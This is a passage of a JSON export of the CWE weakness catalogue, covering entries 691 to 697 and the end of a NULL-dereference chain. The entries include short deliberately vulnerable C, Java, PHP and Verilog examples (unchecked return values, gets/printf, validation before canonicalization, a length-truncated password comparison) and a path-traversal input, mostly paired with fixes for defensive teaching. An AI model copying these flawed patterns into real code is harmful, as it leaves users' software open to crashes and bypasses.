          "Note": "A typical occurrence of this weakness occurs when an application includes user-controlled input to a malloc() call. The related code might be correct with respect to preventing buffer overflows, but if a large value is provided, the malloc() will fail due to insufficient memory. This problem also frequently occurs when a parsing routine expects that certain elements will always be present. If malformed input is provided, the parser might return NULL. For example, strtok() can return NULL."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ]
        },
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands",
            "Read Memory",
            "Modify Memory"
          ],
          "Note": "In rare circumstances, when NULL is equivalent to the 0x0 memory address and privileged code can access it, then writing or reading memory is possible, which may lead to code execution."
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Black Box",
          "Description": "This typically occurs in rarely-triggered error conditions, reducing the chances of detection during black box testing."
        },
        {
          "Method": "White Box",
          "Description": "Code analysis can require knowledge of API behaviors for library functions that might return NULL, reducing the chances of detection when unknown libraries are used."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The code below makes a call to the getUserName() function but doesn't check the return value before dereferencing (which may cause a NullPointerException)."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString username = getUserName();\n\tif (username.equals(ADMIN_USER)) {\n\t\t...\n\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-1",
          "Entries": [
            {
              "IntroText": "This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid host_lookup(char *user_supplied_addr){\n\t\t\tstruct hostent *hp;\n\t\t\tin_addr_t *addr;\n\t\t\tchar hostname[64];\n\t\t\tin_addr_t inet_addr(const char *cp);\n```\n/*routine that ensures user_supplied_addr is in the right format for conversion */* \n\t\t\t\n\t\t\tvalidate_addr_form(user_supplied_addr);\n\t\t\taddr = inet_addr(user_supplied_addr);\n\t\t\thp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);\n\t\t\tstrcpy(hostname, hp->h_name);}"
            },
            {
              "BodyText": "If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. Since the code does not check the return value from gethostbyaddr (CWE-252), a NULL pointer dereference (CWE-476) would then occur in the call to strcpy()."
            },
            {
              "BodyText": "Note that this code is also vulnerable to a buffer overflow (CWE-119)."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2008-1052",
          "Description": "Large Content-Length value leads to NULL pointer dereference when malloc fails.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1052"
        },
        {
          "Reference": "CVE-2006-6227",
          "Description": "Large message length field leads to NULL pointer dereference when malloc fails.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6227"
        },
        {
          "Reference": "CVE-2006-2555",
          "Description": "Parsing routine encounters NULL dereference when input is missing a colon separator.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2555"
        },
        {
          "Reference": "CVE-2003-1054",
          "Description": "URI parsing API sets argument to NULL when a parsing failure occurs, such as when the Referer header is missing a hostname, leading to NULL dereference.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2003-1054"
        },
        {
          "Reference": "CVE-2008-5183",
          "Description": "chain: unchecked return value can lead to NULL dereference",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5183"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "EXP34-C",
          "EntryName": "Do not dereference null pointers",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "ERR08-J",
          "EntryName": "Do not catch NullPointerException or any of its ancestors"
        },
        {
          "TaxonomyName": "SEI CERT Perl Coding Standard",
          "EntryID": "EXP32-PL",
          "EntryName": "Do not ignore function return values",
          "MappingFit": "CWE More Specific"
        }
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is a named chain, which combines multiple weaknesses.",
        "Comments": "Mapping to each separate weakness in the chain would be more precise.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "691",
      "Name": "Insufficient Control Flow Management",
      "Abstraction": "Pillar",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The code does not sufficiently manage its control flow during execution, creating conditions in which the control flow can be modified in unexpected ways.",
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Alter Execution Logic"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-24",
          "Entries": [
            {
              "IntroText": "The following function attempts to acquire a lock in order to perform operations on a shared resource."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid f(pthread_mutex_t *mutex) {\n\t\t\tpthread_mutex_lock(mutex);\n```\n/* access shared resource */* \n\t\t\t\n\t\t\t\n\t\t\tpthread_mutex_unlock(mutex);}"
            },
            {
              "BodyText": "However, the code does not check the value returned by pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire the mutex for any reason, the function may introduce a race condition into the program and result in undefined behavior."
            },
            {
              "BodyText": "In order to avoid data races, correctly written programs must check the result of thread synchronization functions and appropriately handle all errors, either by attempting to recover from them or reporting them to higher levels."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\tint f(pthread_mutex_t *mutex) {\n\t\t\tint result;\n\t\t\tresult = pthread_mutex_lock(mutex);\n\t\t\tif (0 != result)\n\t\t\t\treturn result;\n```\n/* access shared resource */* \n\t\t\t\n\t\t\t\n\t\t\treturn pthread_mutex_unlock(mutex);}"
            }
          ]
        },
        {
          "ID": "DX-181",
          "Entries": [
            {
              "IntroText": "In this example, the programmer has indented the statements to call Do_X() and Do_Y(), as if the intention is that these functions are only called when the condition is true. However, because there are no braces to signify the block, Do_Y() will always be executed, even if the condition is false."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tif (condition==true)\n\t\tDo_X();\n\t\tDo_Y();\n```"
            },
            {
              "BodyText": "This might not be what the programmer intended. When the condition is critical for security, such as in making a security decision or detecting a critical error, this may produce a vulnerability."
            }
          ]
        },
        {
          "ID": "DX-157",
          "Entries": [
            {
              "IntroText": "This function prints the contents of a specified file requested by a user."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\tfunction printFile($username,$filename){\n```\n//read file into string* \n\t\t\t$file = file_get_contents($filename);\n\t\t\tif ($file && isOwnerOf($username,$filename)){\n\t\t\t```\n\t\t\t\techo $file;\n\t\t\t\treturn true;\n\t\t\t}\n\t\t\telse{\n\t\t\t\techo 'You are not authorized to view this file';\n\t\t\t}\n\t\t\treturn false;\n\t}\n```"
            },
            {
              "BodyText": "This code first reads a specified file into memory, then prints the file if the user is authorized to see its contents. The read of the file into memory may be resource intensive and is unnecessary if the user is not allowed to see the file anyway."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2019-9805",
          "Description": "Chain: Creation of the packet client occurs before initialization is complete (CWE-696) resulting in a read from uninitialized memory (CWE-908), causing memory corruption.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2019-9805"
        },
        {
          "Reference": "CVE-2014-1266",
          "Description": "chain: incorrect \"goto\" in Apple SSL product bypasses certificate validation, allowing Adversary-in-the-Middle (AITM) attack (Apple \"goto fail\" bug). CWE-705 (Incorrect Control Flow Scoping) -> CWE-561 (Dead Code) -> CWE-295 (Improper Certificate Validation) -> CWE-393 (Return of Wrong Status Code) -> CWE-300 (Channel Accessible by Non-Endpoint).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2014-1266"
        },
        {
          "Reference": "CVE-2011-1027",
          "Description": "Chain: off-by-one error (CWE-193) leads to infinite loop (CWE-835) using invalid hex-encoded characters.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-1027"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "WASC",
          "EntryID": "40",
          "EntryName": "Insufficient Process Validation"
        }
      ],
      "RelatedAttackPatterns": [
        "29"
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is extremely high-level, a Pillar. However, classification research is limited for weaknesses of this type, so there can be gaps or organizational difficulties within CWE that force use of this weakness, even at such a high level of abstraction.",
        "Comments": "Where feasible, consider children or descendants of this entry instead.",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "692",
      "Name": "Incomplete Denylist to Cross-Site Scripting",
      "Abstraction": "Compound",
      "Structure": "Chain",
      "Status": "Draft",
      "Description": "The product uses a denylist-based protection mechanism to defend against XSS attacks, but the denylist is incomplete, allowing XSS variants to succeed.",
      "ExtendedDescription": "While XSS might seem simple to prevent, web browsers vary so widely in how they parse web pages, that a denylist cannot keep track of all the variations. The \"XSS Cheat Sheet\" [REF-714] contains a large number of attacks that are intended to bypass incomplete denylists.",
      "RelatedWeaknesses": [
        {
          "Nature": "StartsWith",
          "CweID": "184",
          "ViewID": "709"
        },
        {
          "Nature": "ChildOf",
          "CweID": "184",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2007-5727",
          "Description": "Denylist only removes <SCRIPT> tag.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-5727"
        },
        {
          "Reference": "CVE-2006-3617",
          "Description": "Denylist only removes <SCRIPT> tag.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-3617"
        },
        {
          "Reference": "CVE-2006-4308",
          "Description": "Denylist only checks \"javascript:\" tag",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4308"
        }
      ],
      "RelatedAttackPatterns": [
        "120",
        "267",
        "71",
        "80",
        "85"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-714",
          "Authors": [
            "RSnake"
          ],
          "Title": "XSS (Cross Site Scripting) Cheat Sheet",
          "URL": "http://ha.ckers.org/xss.html"
        }
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is a named chain, which combines multiple weaknesses.",
        "Comments": "Mapping to each separate weakness in the chain would be more precise.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "693",
      "Name": "Protection Mechanism Failure",
      "Abstraction": "Pillar",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not use or incorrectly uses a protection mechanism that provides sufficient defense against directed attacks against the product.",
      "ExtendedDescription": "This weakness covers three distinct situations. A \"missing\" protection mechanism occurs when the application does not define any mechanism against a certain class of attack. An \"insufficient\" protection mechanism might provide some defenses - for example, against the most common attacks - but it does not protect against everything that is intended. Finally, an \"ignored\" mechanism occurs when a mechanism is available and in active use within the product, but the developer has not applied it in some code path.",
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "ICS/OT",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ]
        }
      ],
      "RelatedAttackPatterns": [
        "1",
        "107",
        "127",
        "17",
        "20",
        "22",
        "237",
        "36",
        "477",
        "480",
        "51",
        "57",
        "59",
        "65",
        "668",
        "74",
        "87"
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "This CWE entry is extremely high-level, a Pillar.",
        "Comments": "Consider children or descendants of this entry instead.",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Research Gap",
          "Note": "The concept of protection mechanisms is well established, but protection mechanism failures have not been studied comprehensively. It is suspected that protection mechanisms can have significantly different types of weaknesses than the weaknesses that they are intended to prevent."
        }
      ]
    },
    {
      "ID": "694",
      "Name": "Use of Multiple Resources with Duplicate Identifier",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses multiple resources that can have the same identifier, in a context in which unique identifiers are required.",
      "ExtendedDescription": "If the product assumes that each resource has a unique identifier, the product could operate on the wrong resource if attackers can cause multiple resources to be associated with the same identifier.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "99",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "573",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Note": "If unique identifiers are assumed when protecting sensitive resources, then duplicate identifiers might allow attackers to bypass the protection."
        },
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Where possible, use unique identifiers. If non-unique identifiers are detected, then do not operate any resource with a non-unique identifier and report the error appropriately."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-221",
          "Entries": [
            {
              "IntroText": "These two Struts validation forms have the same name."
            },
            {
              "Nature": "Bad",
              "Language": "XML",
              "ExampleCode": "```\n\t <form-validation> \n\t\t <formset> \n\t\t\t <form name=\"ProjectForm\"> ... </form>\n\t\t\t <form name=\"ProjectForm\"> ... </form> \n\t\t </formset> \n\t </form-validation> \n```"
            },
            {
              "BodyText": "It is not certain which form will be used by Struts. It is critically important that validation logic be maintained and kept in sync with the rest of the product."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2013-4787",
          "Description": "chain: mobile OS verifies cryptographic signature of file in an archive, but then installs a different file with the same name that is also listed in the archive.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2013-4787"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "This weakness is probably closely associated with other issues related to doubling, such as CWE-675 (Duplicate Operations on Resource). It's often a case of an API contract violation (CWE-227)."
        }
      ]
    },
    {
      "ID": "695",
      "Name": "Use of Low-Level Functionality",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses low-level functionality that is explicitly prohibited by the framework or specification under which the product is supposed to operate.",
      "ExtendedDescription": "The use of low-level functionality can violate the specification in unexpected ways that effectively disable built-in protection mechanisms, introduce exploitable inconsistencies, or otherwise expose the functionality to attack.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "573",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Other"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-196",
          "Entries": [
            {
              "IntroText": "The following code defines a class named Echo. The class declares one native method (defined below), which uses C to echo commands entered on the console back to the user. The following C code defines the native method implemented in the Echo class:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tclass Echo {\n\t\t\tpublic native void runEcho();\n\t\t\tstatic {\n\t\t\t\t\tSystem.loadLibrary(\"echo\");\n\t\t\t}\n\t\t\tpublic static void main(String[] args) {\n\t\t\t\t\tnew Echo().runEcho();\n\t\t\t}\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#include <jni.h>\n\t#include \"Echo.h\"//the java class above compiled with javah\n\t#include <stdio.h>\n\tJNIEXPORT void JNICALL\n\tJava_Echo_runEcho(JNIEnv *env, jobject obj)\n\t{\n\t\tchar buf[64];\n\t\tgets(buf);\n\t\tprintf(buf);\n\t}\n```"
            },
            {
              "BodyText": "Because the example is implemented in Java, it may appear that it is immune to memory issues like buffer overflow vulnerabilities. Although Java does do a good job of making memory operations safe, this protection does not extend to vulnerabilities occurring in source code written in other languages that are accessed using the Java Native Interface. Despite the memory protections offered in Java, the C code in this example is vulnerable to a buffer overflow because it makes use of gets(), which does not check the length of its input."
            },
            {
              "BodyText": "The Sun Java(TM) Tutorial provides the following description of JNI [See Reference]: The JNI framework lets your native method utilize Java objects in the same way that Java code uses these objects. A native method can create Java objects, including arrays and strings, and then inspect and use these objects to perform its tasks. A native method can also inspect and use objects created by Java application code. A native method can even update Java objects that it created or that were passed to it, and these updated objects are available to the Java application. Thus, both the native language side and the Java side of an application can create, update, and access Java objects and then share these objects between them."
            },
            {
              "BodyText": "The vulnerability in the example above could easily be detected through a source code audit of the native method implementation. This may not be practical or possible depending on the availability of the C source code and the way the project is built, but in many cases it may suffice. However, the ability to share objects between Java and native methods expands the potential risk to much more insidious cases where improper data handling in Java may lead to unexpected vulnerabilities in native code or unsafe operations in native code corrupt data structures in Java. Vulnerabilities in native code accessed through a Java application are typically exploited in the same manner as they are in applications written in the native language. The only challenge to such an attack is for the attacker to identify that the Java application uses native code to perform certain operations. This can be accomplished in a variety of ways, including identifying specific behaviors that are often implemented with native code or by exploiting a system information exposure in the Java application that reveals its use of JNI [See Reference]."
            }
          ]
        },
        {
          "ID": "DX-197",
          "Entries": [
            {
              "IntroText": "The following example opens a socket to connect to a remote server."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n```\n// Perform servlet tasks.* \n\t\t\t...\n\t\t\t\n\t\t\t\n\t\t\t *// Open a socket to a remote server (bad).* \n\t\t\tSocket sock = null;\n\t\t\t\n\t\t\ttry {\n\t\t\t```\n\t\t\t\t\tsock = new Socket(remoteHostname, 3000);\n```\n// Do something with the socket.* \n\t\t\t\t\t...} catch (Exception e) {\n\t\t\t```\n\t\t\t\t...\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "A Socket object is created directly within the Java servlet, which is a dangerous way to manage remote connections."
            }
          ]
        }
      ],
      "RelatedAttackPatterns": [
        "36"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "696",
      "Name": "Incorrect Behavior Order",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product performs multiple related behaviors, but the behaviors are performed in the wrong order in ways which may produce resultant weaknesses.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "691",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Alter Execution Logic"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-35",
          "Entries": [
            {
              "IntroText": "The following code attempts to validate a given input path by checking it against an allowlist and then return the canonical path. In this specific case, the path is considered valid if it starts with the string \"/safe_dir/\"."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString path = getInputPath();\n\tif (path.startsWith(\"/safe_dir/\"))\n\t{\n\t\tFile f = new File(path);\n\t\treturn f.getCanonicalPath();\n\t}\n```"
            },
            {
              "BodyText": "The problem with the above code is that the validation step occurs before canonicalization occurs. An attacker could provide an input path of \"/safe_dir/../\" that would pass the validation step. However, the canonicalization process sees the double dot as a traversal to the parent directory and hence when canonicized the path would become just \"/\"."
            },
            {
              "BodyText": "To avoid this problem, validation should occur after canonicalization takes place. In this case canonicalization occurs during the initialization of the File object. The code below fixes the issue."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tString path = getInputPath();\n\tFile f = new File(path);\n\tif (f.getCanonicalPath().startsWith(\"/safe_dir/\"))\n\t{\n\t\treturn f.getCanonicalPath();\n\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-157",
          "Entries": [
            {
              "IntroText": "This function prints the contents of a specified file requested by a user."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\tfunction printFile($username,$filename){\n```\n//read file into string* \n\t\t\t$file = file_get_contents($filename);\n\t\t\tif ($file && isOwnerOf($username,$filename)){\n\t\t\t```\n\t\t\t\techo $file;\n\t\t\t\treturn true;\n\t\t\t}\n\t\t\telse{\n\t\t\t\techo 'You are not authorized to view this file';\n\t\t\t}\n\t\t\treturn false;\n\t}\n```"
            },
            {
              "BodyText": "This code first reads a specified file into memory, then prints the file if the user is authorized to see its contents. The read of the file into memory may be resource intensive and is unnecessary if the user is not allowed to see the file anyway."
            }
          ]
        },
        {
          "ID": "DX-187",
          "Entries": [
            {
              "IntroText": "Assume that the module foo_bar implements a protected register. The register content is the asset. Only transactions made by user id (indicated by signal usr_id) 0x4 are allowed to modify the register contents. The signal grant_access is used to provide access."
            },
            {
              "Nature": "Bad",
              "Language": "Verilog",
              "ExampleCode": "module foo_bar(data_out, usr_id, data_in, clk, rst_n);\n output reg [7:0] data_out;\n input wire [2:0] usr_id;\n input wire [7:0] data_in; \n input wire clk, rst_n;\n wire grant_access;\n always @ (posedge clk or negedge rst_n)\n begin\n\n```\n\t if (!rst_n)\n\t\t data_out = 0; \n\t else \n\t\t data_out = (grant_access) ? data_in : data_out;\n\t\t assign grant_access = (usr_id == 3'h4) ? 1'b1 : 1'b0;\n end\n endmodule\n```"
            },
            {
              "BodyText": "This code uses Verilog blocking assignments for data_out and grant_access. Therefore, these assignments happen sequentially (i.e., data_out is updated to new value first, and grant_access is updated the next cycle) and not in parallel. Therefore, the asset data_out is allowed to be modified even before the access control check is complete and grant_access signal is set. Since grant_access does not have a reset value, it will be meta-stable and will randomly go to either 0 or 1."
            },
            {
              "BodyText": "Flipping the order of the assignment of data_out and grant_access should solve the problem. The correct snippet of code is shown below."
            },
            {
              "Nature": "Good",
              "Language": "Verilog",
              "ExampleCode": "always @ (posedge clk or negedge rst_n)\n begin\n\n```\n\t if (!rst_n)\n\t\t data_out = 0;\n\t else\n\t\t assign grant_access = (usr_id == 3'h4) ? 1'b1 : 1'b0;\n\t\t data_out = (grant_access) ? data_in : data_out;\n end\n endmodule\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2019-9805",
          "Description": "Chain: Creation of the packet client occurs before initialization is complete (CWE-696) resulting in a read from uninitialized memory (CWE-908), causing memory corruption.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2019-9805"
        },
        {
          "Reference": "CVE-2007-5191",
          "Description": "file-system management programs call the setuid and setgid functions in the wrong order and do not check the return values, allowing attackers to gain unintended privileges",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-5191"
        },
        {
          "Reference": "CVE-2007-1588",
          "Description": "C++ web server program calls Process::setuid before calling Process::setgid, preventing it from dropping privileges, potentially allowing CGI programs to be called with higher privileges than intended",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1588"
        },
        {
          "Reference": "CVE-2022-37734",
          "Description": "Chain: lexer in Java-based GraphQL server does not enforce maximum of tokens early enough (CWE-696), allowing excessive CPU consumption (CWE-1176)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-37734"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "POS36-C",
          "EntryName": "Observe correct revocation order while relinquishing privileges",
          "MappingFit": "CWE More Abstract"
        }
      ],
      "RelatedAttackPatterns": [
        "463"
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "697",
      "Name": "Incorrect Comparison",
      "Abstraction": "Pillar",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product compares two entities in a security-relevant context, but the comparison is incorrect, which may lead to resultant weaknesses.",
      "ExtendedDescription": "\n\nThis Pillar covers several possibilities:\n\n\n  - the comparison checks one factor incorrectly;\n\n  - the comparison should consider multiple factors, but it does not check at least one of those factors at all;\n\n  - the comparison checks the wrong factor.\n\n",
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "Not Technology-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Varies by Context"
          ]
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-115",
          "Entries": [
            {
              "IntroText": "Consider an application in which Truck objects are defined to be the same if they have the same make, the same model, and were manufactured in the same year."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class Truck {\n\t\t\tprivate String make;\n\t\t\tprivate String model;\n\t\t\tprivate int year;\n\t\t\tpublic boolean equals(Object o) {\n\t\t\t\t\tif (o == null) return false;\n\t\t\t\t\tif (o == this) return true;\n\t\t\t\t\tif (!(o instanceof Truck)) return false;\n\t\t\t\t\tTruck t = (Truck) o;\n\t\t\t\t\treturn (this.make.equals(t.getMake()) && this.model.equals(t.getModel()));\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "Here, the equals() method only checks the make and model of the Truck objects, but the year of manufacture is not included."
            }
          ]
        },
        {
          "ID": "DX-116",
          "Entries": [
            {
              "IntroText": "This example defines a fixed username and password. The AuthenticateUser() function is intended to accept a username and a password from an untrusted user, and check to ensure that it matches the username and password. If the username and password match, AuthenticateUser() is intended to indicate that authentication succeeded."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n```\n/* Ignore CWE-259 (hard-coded password) and CWE-309 (use of password system for authentication) for this example. */* \n\t\n\tchar *username = \"admin\";\n\tchar *pass = \"password\";\n\t\n\tint AuthenticateUser(char *inUser, char *inPass) {\n\t```\n\t\tif (strncmp(username, inUser, strlen(inUser))) {\n\t\t\tlogEvent(\"Auth failure of username using strlen of inUser\");\n\t\t\treturn(AUTH_FAIL);\n\t\t}\n\t\tif (! strncmp(pass, inPass, strlen(inPass))) {\n\t\t\tlogEvent(\"Auth success of password using strlen of inUser\");\n\t\t\treturn(AUTH_SUCCESS);\n\t\t}\n\t\telse {\n\t\t\tlogEvent(\"Auth fail of password using sizeof\");\n\t\t\treturn(AUTH_FAIL);\n\t\t}\n\t}\n\tint main (int argc, char **argv) {\n\t\t int authResult;\n\t\tif (argc < 3) {\n\t\t\tExitError(\"Usage: Provide a username and password\");\n\t\t}\n\t\tauthResult = AuthenticateUser(argv[1], argv[2]);\n\t\tif (authResult == AUTH_SUCCESS) {\n\t\t\tDoAuthenticatedTask(argv[1]);\n\t\t}\n\t\telse {\n\t\t\tExitError(\"Authentication failed\");\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "In AuthenticateUser(), the strncmp() call uses the string length of an attacker-provided inPass parameter in order to determine how many characters to check in the password. So, if the attacker only provides a password of length 1, the check will only examine the first byte of the application's password before determining success."
            },
            {
              "BodyText": "As a result, this partial comparison leads to improper authentication (CWE-287)."
            },
            {
              "BodyText": "Any of these passwords would still cause authentication to succeed for the \"admin\" user:"
            },
            {
              "Nature": "Attack",
